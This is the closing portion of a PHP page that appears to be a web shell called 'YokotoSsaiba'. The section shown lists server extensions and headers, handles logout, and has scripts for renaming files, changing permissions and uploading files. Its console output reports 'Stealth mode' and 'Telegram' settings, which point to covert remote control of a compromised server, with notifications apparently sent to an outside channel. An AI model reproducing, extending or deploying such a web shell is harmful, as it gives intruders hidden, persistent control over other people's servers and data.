                <?php $exts = get_loaded_extensions(); sort($exts); foreach($exts as $ext): ?>
                <span class="badge badge-info"><?php echo htmlspecialchars($ext); ?></span>
                <?php endforeach; ?>
            </div>
        </div>
    </div>
    
    <div class="card">
        <div class="card-header">🌐 Server Headers</div>
        <div class="card-body">
            <pre><?php foreach(headers_list() as $h) echo htmlspecialchars($h)."\n"; ?></pre>
        </div>
    </div>
    <?php endif; ?>

    <!-- ============================================================
    LOGOUT
    ============================================================ -->
    <?php if ($action == 'logout'): session_destroy(); header('Location: '.$_SERVER['PHP_SELF']); exit; endif; ?>

</div>

<script>
// ============================================================
// SIDEBAR TOGGLE
// ============================================================
const menuToggle=document.getElementById('menuToggle');
const sidebar=document.getElementById('sidebar');
const overlay=document.getElementById('overlay');

if(menuToggle && sidebar && overlay){
    menuToggle.addEventListener('click',function(){
        sidebar.classList.toggle('open');
        overlay.classList.toggle('active');
    });
    overlay.addEventListener('click',function(){
        sidebar.classList.remove('open');
        overlay.classList.remove('active');
    });
    document.addEventListener('click',function(e){
        if(window.innerWidth<=768){
            if(!sidebar.contains(e.target)&&!menuToggle.contains(e.target)){
                sidebar.classList.remove('open');
                overlay.classList.remove('active');
            }
        }
    });
}

// ============================================================
// RENAME & CHMOD HELPERS
// ============================================================
function renameFile(oldname){
    let newname=prompt('New name:',oldname);
    if(newname && newname!==oldname){
        let f=document.createElement('form');
        f.method='POST';
        f.action='?action=rename&path=<?php echo urlencode($path); ?>';
        f.innerHTML='<input type="hidden" name="old_name" value="'+oldname+'"><input type="hidden" name="new_name" value="'+newname+'">';
        document.body.appendChild(f);
        f.submit();
    }
}

function chmodFile(filename){
    let perms=prompt('Permissions (755, 644, 777):','755');
    if(perms && /^[0-7]{3,4}$/.test(perms)){
        let f=document.createElement('form');
        f.method='POST';
        f.action='?action=chmod&path=<?php echo urlencode($path); ?>';
        f.innerHTML='<input type="hidden" name="chmod_target" value="'+filename+'"><input type="hidden" name="perms" value="'+perms+'">';
        document.body.appendChild(f);
        f.submit();
    }else if(perms){
        alert('Invalid permission format! Use 755, 644, 777, etc.');
    }
}

// ============================================================
// MODAL CLOSE
// ============================================================
document.addEventListener('keydown',function(e){
    if(e.key==='Escape'){
        document.querySelectorAll('.modal-overlay.active').forEach(m=>m.classList.remove('active'));
    }
});

// ============================================================
// UPLOAD DROP ZONE
// ============================================================
const uploadInput = document.getElementById('uploadInput');
if(uploadInput){
    const dropZone = uploadInput.parentElement;
    dropZone.addEventListener('dragover',function(e){
        e.preventDefault();
        this.style.borderColor='var(--accent)';
        this.style.background='rgba(99,102,241,0.05)';
    });
    dropZone.addEventListener('dragleave',function(e){
        e.preventDefault();
        this.style.borderColor='var(--border-color)';
        this.style.background='transparent';
    });
    dropZone.addEventListener('drop',function(e){
        e.preventDefault();
        this.style.borderColor='var(--border-color)';
        this.style.background='transparent';
        if(e.dataTransfer.files.length){
            uploadInput.files = e.dataTransfer.files;
            uploadInput.dispatchEvent(new Event('change'));
        }
    });
    uploadInput.addEventListener('change',function(){
        if(this.files.length){
            const label = this.parentElement.querySelector('div');
            if(label){
                label.innerHTML = '<div style="font-size:48px;">✅</div><div>'+this.files[0].name+' ('+formatSize(this.files[0].size)+')</div>';
            }
        }
    });
}

function formatSize(bytes){
    if(bytes < 1024) return bytes + ' B';
    if(bytes < 1048576) return (bytes/1024).toFixed(1) + ' KB';
    if(bytes < 1073741824) return (bytes/1048576).toFixed(1) + ' MB';
    return (bytes/1073741824).toFixed(1) + ' GB';
}

console.log('🔥 YokotoSsaiba v<?php echo YOKOTO_VERSION; ?> loaded.');
console.log('🕵️ Stealth mode: <?php echo $CONFIG['enable_stealth'] ? 'ON' : 'OFF'; ?>');
console.log('📡 Telegram: <?php echo $CONFIG['enable_telegram'] ? 'ON' : 'OFF'; ?>');
</script>
</body>
</html>
<?php ob_end_flush(); ?>